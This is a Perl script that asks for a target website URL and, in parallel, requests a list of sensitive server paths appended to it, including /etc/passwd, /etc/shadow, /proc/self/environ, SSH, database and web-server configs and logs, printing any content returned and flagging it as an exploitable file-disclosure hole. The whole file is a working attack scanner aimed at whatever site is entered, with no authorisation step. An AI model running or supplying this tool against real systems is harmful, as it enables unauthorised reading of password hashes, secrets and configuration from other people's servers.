#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;
use Parallel::ForkManager;
use Term::ANSIColor;

# Prompt user for target website URL
print colored("Enter your target website URL: ", "blue");
my $url = <STDIN>;
chomp($url);

# Check if URL is valid
unless ($url =~ m/^https?:\/\//i) {
    print colored("Invalid URL format. Please provide a valid URL starting with http:// or https://\n", "red");
    exit;
}

# Number of parallel processes
my $max_procs = 10; # Adjust according to system resources and network speed

# List of sensitive files and directories to check
my @files_to_check = (
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/resolv.conf",
    "/etc/network/interfaces",
    "/etc/ssh/sshd_config",
    "/etc/ssh/ssh_config",
    "/etc/apache2/apache2.conf",
    "/etc/apache2/httpd.conf",
    "/etc/nginx/nginx.conf",
    "/etc/nginx/sites-available/default",
    "/etc/mysql/my.cnf",
    "/etc/postgresql/9.6/main/pg_hba.conf",
    "/var/www/html/index.php",
    "/var/www/cgi-bin/",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/proc/self/environ",
    "/proc/net/tcp",
    "/proc/net/udp",
    "/proc/net/raw",
    "/proc/version",
    "/proc/cmdline",
    "/proc/mounts",
    "/proc/self/cmdline",
    "/proc/self/mountinfo",
    "/proc/self/status",
    "/proc/self/fd/0",
    "/proc/self/fd/1",
    "/proc/self/fd/2"
);


# Initialize user agent
my $ua = LWP::UserAgent->new;

# Fork manager for parallel processing
my $pm = Parallel::ForkManager->new($max_procs);

# Function to check for insecure file handling vulnerability
sub check_vulnerability {
    my ($file) = @_;

    my $response = $ua->get("$url$file");

    # Check HTTP response code and content for potential vulnerabilities
    if ($response->is_success) {
        print colored("[$file] Response: " . $response->status_line . "\n", "green");
        print colored("[$file] Content: " . $response->decoded_content . "\n", "green");
        if ($response->decoded_content =~ /root|shadow|localhost/) {
            print colored("[$file] Vulnerability found: File content indicates sensitive information!\n", "red");
            print colored("Exploit: Try accessing sensitive files via the URL directly.\n", "green");
        }
    } else {
        print colored("[$file] Error: " . $response->status_line . "\n", "red");
    }
}

# Check for vulnerability in parallel
foreach my $file (@files_to_check) {
    $pm->start and next;
    check_vulnerability($file);
    $pm->finish;
}
$pm->wait_all_children;
